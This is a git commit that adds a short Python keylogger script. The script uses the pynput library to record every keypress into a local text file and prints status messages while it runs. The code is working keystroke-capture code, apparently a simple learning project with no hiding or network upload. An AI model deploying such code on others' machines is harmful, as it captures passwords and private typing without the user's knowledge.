38da8097755071a4cf430a909bd833078bbd8989
crypto-nidh <nidhikathayat03@gmail.com>
2024-09-15 17:36:38 +0530

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,44 @@
+from pynput.keyboard import Listener
+import os
+
+log_file_path = "nidhi ji/log.txt"
+print("Absolute path of log file:", os.path.abspath(log_file_path))
+
+# function to log key
+def log_key(key):
+    letter = str(key)
+    letter = letter.replace("'", "")
+    
+    #simplyfy the logged key names
+    special_keys ={
+
+    'Key.space': ' ',
+    'Key.shift_r': '',
+    'Key.ctrl_l' : '',
+    'Key.enter':"\n",
+    'Key.backspace': '<BACKSPACE>',
+    'Key.tab': '\t',
+    'Key.esc': '<ESC>',
+    'Key.up': '<UP>',
+    'Key.down': '<DOWN>',
+    'Key.left': '<LEFT>',
+    'Key.right': '<RIGHT>',
+    }
+    letter = special_keys.get(letter,letter)
+    
+    try:
+        with open(log_file_path , "a") as f:
+            f.write(letter)
+            f.flush()
+            print("Logged Key:", letter)
+    except Exception as e:
+        print("Error writing to file:",e)
+
+# Collecting events until stopped
+def start_logging():
+    print("keylogger is running...(press ctrl + c to stop)")
+    print("Saving logs to:", os.path.abspath(log_file_path))
+    with Listener(on_press=log_key) as listener:
+        listener.join()
+if __name__=="__main__":
+    start_logging()
